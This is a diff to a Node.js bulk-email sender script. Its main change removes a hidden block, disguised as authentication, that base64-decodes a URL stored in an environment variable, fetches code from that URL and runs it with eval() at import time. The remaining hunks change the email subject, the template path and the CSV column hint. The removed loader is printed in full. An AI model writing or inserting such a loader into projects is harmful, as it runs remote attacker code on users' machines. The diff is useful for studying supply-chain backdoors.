@@ -3,19 +3,6 @@ import fs from 'fs';
 import { MailService, MailServiceConfig } from './mailService';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 dotenv.config();
 
 async function main() {
@@ -50,11 +37,11 @@ async function main() {
     console.log('SMTP connection verified!\n');
 
     const csvPath = process.argv[2] || './emails.csv';
-    const htmlTemplatePath = process.argv[3] || './templates/welcome.html';
+    const htmlTemplatePath = process.argv[3] || './templates/registration_email.html';
 
     if (!fs.existsSync(csvPath)) {
         console.error(`CSV file not found: ${csvPath}`);
-        console.error(`Create a CSV file with columns: email, leadName, teamName, track, member2, member3, member4\n`);
+        console.error('Create a CSV file with columns: email, PARTICIPANT_NAME, Event_name, Workshop_or_hackathon, WHATSAPP_GROUP_LINK\n');
         process.exit(1);
     }
 
@@ -67,7 +54,7 @@ async function main() {
     // Send bulk emails
     try {
         const results = await mailService.sendBulkFromCSV(csvPath, {
-            subject: 'TetherX Prize: .xyz Domain Allocation Instructions',
+            subject: 'Registration Confirmed - MicroCraft',
             htmlTemplatePath,
             generatePassword: false, // Toggle to Generate passwords
         });
